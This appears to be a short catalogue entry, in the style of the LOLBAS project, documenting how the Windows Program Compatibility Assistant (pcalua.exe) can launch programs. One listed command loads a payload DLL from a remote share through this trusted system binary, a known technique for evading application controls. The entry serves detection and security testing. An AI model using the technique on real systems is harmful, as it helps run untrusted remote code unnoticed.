---
name: Pcalua.exe
description: 
functions:
  execute:
    - description: Open the target .EXE using the Program Compatibility Assistant.
      code: pcalua.exe -a calc.exe
    - description: Open the target .DLL file with the Program Compatibilty Assistant.
      code: pcalua.exe -a \\server\payload.dll
    - description: Open the target .CPL file with the Program Compatibility Assistant.
      code: pcalua.exe -a C:\Windows\system32\javacpl.cpl -c Java
resources: 
    - resource: https://twitter.com/KyleHanslovan/status/912659279806640128
fullpath: 
    - path: c:\windows\system32\pcalua.exe
notes: Thanks to fab - @0rbz_, Kyle Hanslovan - @KyleHanslovan
---